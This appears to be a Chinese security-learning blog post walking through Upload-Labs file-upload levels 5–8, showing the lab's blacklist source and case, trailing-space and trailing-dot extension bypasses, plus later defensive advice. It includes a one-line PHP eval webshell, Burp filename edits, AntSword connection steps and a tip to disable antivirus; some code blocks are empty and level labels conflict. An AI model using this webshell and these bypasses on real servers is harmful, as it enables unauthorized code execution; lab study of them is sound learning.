#  为了过个上传漏洞，我换了三个环境：一个安全菜鸟的踩坑实录——Upload-Labs 5-8关排坑记  
原创 武文学网安
                        武文学网安  武文学网安   2026-03-02 19:22  
  
大家好，我是武文。  
  
前面我们已经完成了 Upload Labs 前几关的基础绕过。本篇继续实战：  
- ✅ 第5关：**大小写绕过**  
  
- ✅ 第6关：**点后缀绕过**  
  
- ✅ 第7关：**空格绕过**  
  
这三关的核心，其实不是“技巧”，而是——  
> 🔎 **通过阅读源码，看它到底“没有过滤什么”。**  
  
  
真正的文件上传漏洞，不是记 payload，而是学会看逻辑漏洞。  
# 一、Upload Labs 第6关 —— 大小写绕过  
## 1️⃣ 先看源码逻辑  
  
第5关核心代码大致类似：  
```
$deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
 $file_name = trim($_FILES['upload_file']['name']);
 $file_name = deldot($file_name);//删除文件名末尾的点
$file_ext = strrchr($file_name, '.');
$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
$file_ext = trim($file_ext); //首尾去空
```  
### 乍一看似乎没啥问题，但和前面的关卡源码比较，我们会发现这里是少了一个转换为小写的处理步骤。  
### 问题在哪里？  
  
过滤规则：  
- 使用 strpos  
  
- 黑名单固定写死  
  
- **没有统一转换大小写**  
  
也就是说：  
```
.php   被过滤
.PHP   没有被过滤
.PhP   没有被过滤
```  
## 2️⃣ 实战绕过  
  
准备一句话木马：  
```
<?php@eval($_POST['cmd']); ?>
```  
  
保存为：  
```
```  
  
上传。  
  
✅ 成功通过检测。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/5vTt22mqAAxkdficEbwdEic2oRiafz9WE3O7FicvLeR8ww6AYu6YU4TkJsjjFx82C9FxOMaRR9EtgJ8eQkt3zTrMz53ID7RtMK2ltrJstQNZo4U/640?wx_fmt=gif&from=appmsg "")  
## 3️⃣ 为什么能成功？  
  
因为：  
- strpos()  
 是区分大小写的  
  
- 黑名单只写了小写 .php  
  
- 服务器（Apache + PHP）对扩展名不区分大小写  
  
## 4️⃣ 核心知识点  
### PHP字符串函数默认区分大小写  
```
strpos()        // 区分大小写
stripos()       // 不区分大小写
```  
  
第6关没有使用 strtolower()  
 或 stripos()  
，这就是漏洞点。  
  
用蚁剑连接对应的连接：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/5vTt22mqAAx5Mn2PpJukyRwdEaciapeDVw6xjqMG5gLfFTicvC1RwjYxNIwIaNthybEmLoy1hibLISmx0XftrVzdvh60l2Mw7kic0fQxklEvyib8/640?wx_fmt=gif&from=appmsg "")  
  
会发现报错500。我们如果直接在upload文件夹下创建文件，可以用蚁剑直接连接。  
一段时间排查，最开始以为是上传时对应文件在该目录下权限异常引起。  
  
在靶场中修改upload文件对应权限。  
  
修改步骤——>属性——>安全——>选择对应角色打勾  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5vTt22mqAAyzeATK4MMSdWyPXYOtQ1SnLCjjabSfSCuK2sjqZZjkOUSicaUicOEuicnVcEyMduBpAVIicJl4sIM0fBZnAvhVkyLOWibF1zsic7Kuw/640?wx_fmt=png&from=appmsg "")  
  
发现依然不能连接。  
  
在upload文件夹中把后缀修改为小写的php发现可以直接连接，说明是因为PhP没有被正常解析。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/5vTt22mqAAxVkicPhqwQT7PyaVo2dib2m65OD8tgq3j46ibJxl2qclXWgVRUVdFSeJW2eGofvtiano9j8sRQzClrtRP6WpM3htsibGiafiaEyMr2d0/640?wx_fmt=png&from=appmsg "")  
  
折腾半天蚁剑也连不上了。  
  
更换各种环境发现依然如此，不得不让人怀疑是蚁剑连接出了问题。于是用postman进行测试，结果测试成功。说明PhP的文件也是被直接解析了的。  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/5vTt22mqAAyOVGyCRLLwiaib0iaaehn4ox388NyTeDJSBZWuCF0fQX9cxEXwDVL1bNGeKyev0bhFVR2oKKU8Muf517x9Ce334TPLuPiaGGnicKg8/640?wx_fmt=gif&from=appmsg "")  
  
但蚁剑为什么这样，一直没搞清楚。  
  
试了两天，换了系统环境，docker环境测试都一样。结果是  
是 **PHPStudy 默认的 PHP 版本（NTS 版本）限制了 Apache 的某些配置指令生效。我重新把php版本更换为了5.3.38发现就能够正确解析执行PhP结尾的文件了。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5vTt22mqAAyiaa67HiaoWB1QjzCMvbuliaGLScBc9nCbCoxhVUIibztWy4jaibBG6TJgblIaVHYyjTdiceqJzElrpCM1ueVYBbPa1YIJp34mib1eDI/640?wx_fmt=png&from=appmsg "")  
  
更改php版本在测试上传：  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/5vTt22mqAAyMkXzyh0ND8olSLVw9HDeZuqbwq9JlVFdkWg1ladVeWS66BSCUTibcNzul8c5nY9JU3iaicib76kUpMJuOqiafclj7DGDw2pJEOWEY/640?wx_fmt=gif&from=appmsg "")  
  
然后用蚁剑尝试成功连接：  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/5vTt22mqAAw4bJdbvn32mylydRMColJ3LLhqvQSMkLLFnMWKghDoOCbmVBnuTInbq24b0dlFwhqwBY3DAFPC3Q7h8YmkWbbfJA9n2wm4MjI/640?wx_fmt=gif&from=appmsg "")  
  
#   
# 二、Upload Labs 第7关 —— 空格绕过  
## 1️⃣ 查看源码  
  
第7关一般过滤逻辑类似第6关，但仍然没有做完整处理。  
```
$deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
$file_name = $_FILES['upload_file']['name'];
$file_name = deldot($file_name);//删除文件名末尾的点
$file_ext = strrchr($file_name, '.');
$file_ext = strtolower($file_ext); //转换为小写
$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
```  
  
和前面几关源码对比，会发现，这里少了一个  
```
$file_ext = trim($file_ext); //首尾去空
```  
  
它检查：  
```
```  
  
仍然只看最后一个后缀。  
## 2️⃣ 绕过构造  
  
我们上传：  
```
shell.php 
```  
  
注意：  
  
先清空上传文件  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/5vTt22mqAAxRp7dOvgLtfLUDO5rnou0C56BPxNvpanLicz6Un71wk08icF3ic0Ll7eBnRTw2m95ngxhn5BhTATic86BGRI51ktx3Ojhz1bILk3E/640?wx_fmt=gif&from=appmsg "")  
  
上传shell.php利用burp suite抓包修改文件名，在文件名后面新增一个空格  
  
服务器解析：  
- 后缀变成 .php   
  
- 不等于 .php  
  
- 通过检测  
  
Windows保存时：  
```
```  
  
会自动去掉末尾空格：  
```
```  
  
成功变成可执行脚本。  
  
  
## 3️⃣ 原理总结  
  
Windows文件系统自动处理：  
<table><thead><tr><th><section><span leaf="">原文件名</span></section></th><th><section><span leaf="">实际保存</span></section></th></tr></thead><tbody><tr><td><section><span leaf="">shell.php.</span></section></td><td><section><span leaf="">shell.php</span></section></td></tr><tr><td><section><span leaf="">shell.php</span></section></td><td><section><span leaf="">shell.php</span></section></td></tr></tbody></table>  
而服务器端判断使用的是：  
```
```  
  
不是：  
```
```  
# 三、Upload Labs 第8关 —— 点后缀绕过  
# 注意：点绕过是Windows特有的文件系统特性，在Linux下完全无效  
## 1️⃣ 看源码逻辑  
```
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
```  
  
少了一个  
deldot()处理函数。  
## 2️⃣ 绕过思路  
  
我们构造：  
```
```  
  
最后一个字符是点。  
  
服务器处理逻辑：  
- PHP 获取后缀：.  
  
- 判断不是 .php  
  
- 成功上传  
  
而 Windows 文件系统：  
```
```  
  
会被自动解析为：  
```
```  
  
最终仍然是 PHP 文件。  
## 3️⃣ 原理解析  
  
Windows 对文件名有自动修正机制：  
- 末尾的 .  
 会被自动去掉  
  
- 末尾空格也会被去掉  
  
所以：  
```
shell.php.
shell.php..
shell.php.....
```  
  
都会被识别为：  
```
```  
## 4️⃣ 本关漏洞本质  
- 只做字符串判断  
  
- 未对文件名进行规范化处理  
  
- 未使用白名单机制  
  
# 实践：  
# 上传时利用burp suite在文件结尾加.  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/5vTt22mqAAzjicicmVIibbiaklokeyNUicL5tVa6FOphRYkePeia0KRG9FN7CEia6WlgHzhicdG2wGH8rC3fktQT0yCr3Nt5icNMKqLhVxDJvLdMNSc0/640?wx_fmt=gif&from=appmsg "")  
# 打开文件对应的连接，利用蚁剑尝试连接，这里需要注意：连接末尾的点要去掉，因为此时保存在服务端的名称已经去掉了。  
#   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/5vTt22mqAAz6RGVaiaaMAlCsAVcibiasUR4bEqGbFTXG5FnicD1RxgdErsNmyBKxiaFOwAic4SwFnN1JCICX2tH59bdGxuT2Ja6WT6SmPiaCnXg2ibU/640?wx_fmt=gif&from=appmsg "")  
#   
#   
# 四、三关的本质区别  
<table><thead><tr><th><section><span leaf="">关卡</span></section></th><th><section><span leaf="">绕过方式</span></section></th><th><section><span leaf="">漏洞点</span></section></th></tr></thead><tbody><tr><td><section><span leaf="">第6关</span></section></td><td><section><span leaf="">大小写绕过</span></section></td><td><section><span leaf="">未统一大小写</span></section></td></tr><tr><td><section><span leaf="">第7关</span></section></td><td><section><span leaf="">点后缀绕过</span></section></td><td><section><span leaf="">只检查最后一个点</span></section></td></tr><tr><td><section><span leaf="">第8关</span></section></td><td><section><span leaf="">空格绕过</span></section></td><td><section><span leaf="">未去除尾部特殊字符</span></section></td></tr></tbody></table># 五、为什么黑名单注定不安全？  
  
黑名单的问题在于：  
- 永远过滤不全  
  
- 容易被编码绕过  
  
- 容易被变形绕过  
  
- 依赖字符串匹配  
  
真正安全的方式应该是白名单：  
```
$whitelist = array("jpg","png","gif");
```  
  
并且：  
- 统一小写  
  
- 去除空格  
  
- 去除尾点  
  
- 使用 MIME 校验  
  
- 重新生成文件名  
  
- 存储到不可执行目录  
  
# 六、从源码审计的思路总结  
  
当你做文件上传题目时：  
### ① 先找黑名单还是白名单  
### ② 是否统一大小写  
### ③ 是否 trim() 处理  
### ④ 是否使用 pathinfo()  
### ⑤ 是否重命名文件  
### ⑥ 是否检测 MIME  
### ⑦ 是否检测文件内容  
  
你不是在“想 payload”，  
  
你是在找：  
> 🧠 它哪里没做。  
  
# 七、进阶思考:为什么环境不同，结果大不一样？  
  
通过这几关的实战，我有一个很深的体会：**同一个绕过方法，在不同环境下结果可能完全不同**  
。这不是"玄学"，而是由三个关键因素决定的。  
### 1️⃣ 操作系统层面的差异  
<table><thead><tr><th style="border-bottom: 0.909091px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px 10px 0px;text-align: left;"><section><span leaf="">系统</span></section></th><th style="border-bottom: 0.909091px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">对带点/空格文件名的处理</span></section></th><th style="border-bottom: 0.909091px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">点绕过是否有效</span></section></th><th style="border-bottom: 0.909091px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">空格绕过是否有效</span></section></th></tr></thead><tbody><tr><td style="border-bottom: 0.909091px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><strong style="font-weight: 600;"><span leaf="">Windows</span></strong></td><td style="border-bottom: 0.909091px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">自动去除尾部的点和空格</span></section></td><td style="border-bottom: 0.909091px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">✅ 有效</span></section></td><td style="border-bottom: 0.909091px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">✅ 有效</span></section></td></tr><tr><td style="border-bottom: 0.909091px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><strong style="font-weight: 600;"><span leaf="">Linux</span></strong></td><td style="border-bottom: 0.909091px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">保留原文件名</span></section></td><td style="border-bottom: 0.909091px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">❌ 无效</span></section></td><td style="border-bottom: 0.909091px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">❌ 无效</span></section></td></tr></tbody></table>  
我在实验中发现，同样是点绕过，在Windows物理机上能成功，在Docker容器（Linux）里就失败了。这不是方法不对，而是**点绕过本质上是Windows文件系统的特性**  
，在Linux下根本不成立。  
### 2️⃣ Web服务器配置的差异  
  
大小写绕过的经历让我印象最深。一开始在PHPStudy默认环境下，shell.PhP  
上传成功但**死活不执行**  
，折腾了两天才发现：  
- PHPStudy默认的PHP版本（如7.3以上NTS版本）**限制了Apache对文件名大小写的处理**  
  
- 换成PHP 5.3.38版本后，shell.PhP  
立刻被正常解析  
  
这说明：**Apache + PHP是否区分文件名大小写，完全取决于服务器配置和PHP版本**  
。不是大小写绕过"理论上成立"就一定能成功，得看实际环境支不支持。  
### 3️⃣ 靶场版本的差异  
  
Upload-Labs这个靶场有很多版本，不同版本的关卡顺序完全是乱的：  
<table><thead><tr><th style="border-bottom: 0.909091px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px 10px 0px;text-align: left;"><section><span leaf="">绕过方法</span></section></th><th style="border-bottom: 0.909091px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">版本A</span></section></th><th style="border-bottom: 0.909091px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">版本B</span></section></th></tr></thead><tbody><tr><td style="border-bottom: 0.909091px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><section><span leaf="">大小写绕过</span></section></td><td style="border-bottom: 0.909091px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">Pass-05</span></section></td><td style="border-bottom: 0.909091px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">Pass-06</span></section></td></tr><tr><td style="border-bottom: 0.909091px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><section><span leaf="">空格绕过</span></section></td><td style="border-bottom: 0.909091px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">Pass-06</span></section></td><td style="border-bottom: 0.909091px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">Pass-07</span></section></td></tr><tr><td style="border-bottom: 0.909091px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><section><span leaf="">点绕过</span></section></td><td style="border-bottom: 0.909091px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">Pass-07</span></section></td><td style="border-bottom: 0.909091px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">Pass-08</span></section></td></tr></tbody></table>  
我一开始按博客说的"第7关是点绕过"去操作，结果怎么试都失败。后来才发现，在我的版本里点绕过在第8关。**不要信序号，要信源码**  
——这是我踩坑后的深刻教训。  
### 4️⃣ 给读者的实战建议  
  
基于我的踩坑经历，给你三条建议：  
  
**① 先确认环境，再套用方法**  
- 用Windows还是Linux？决定了点/空格绕过能不能用  
  
- 靶场环境的病毒检测会直接删除上传的脚本文件，试验时建议关闭实时检测。  
  
- PHP是什么版本？决定了大小写绕过是否生效  
  
- 最简单的验证方法：上传成功后，**去服务器目录看一眼实际文件名**  
  
**② 绕过失败时，按顺序排查**  
- 是没绕过过滤？（看源码，找它没过滤什么）  
  
- 还是绕过了但没解析？（看服务器配置，测PHP版本）  
  
- 用Postman验证：文件到底有没有被执行  
  
**③ 把"环境差异"记进笔记**  
  
不要只记"第X关用Y方法绕过"，要记：  
- 这个绕过方法依赖什么环境？（Windows特性？PHP配置？）  
  
- 换到Linux/其他版本怎么办？  
  
### 5️⃣ 核心认知升级  
  
文件上传漏洞的学习，不是背下一份"通关秘籍"，而是理解：  
> **漏洞利用 = 代码逻辑漏洞 + 系统特性 + 服务器配置**  
> 同一个漏洞点，换一个环境可能就完全失效。  
  
  
你能绕过多少关不重要，重要的是——**换一个你没见过的环境，还能不能找出突破口**  
。  
  
# 八、本阶段学习重点  
  
通过第5-7关，我们应该掌握：  
- 字符串过滤漏洞  
  
- 黑名单绕过思维  
  
- 文件系统特性利用  
  
- 源码审计的重要性  
  
文件上传漏洞的精髓不是 payload，  
  
而是：  
> 🧩 理解服务器如何解析文件名。  
  
  
  
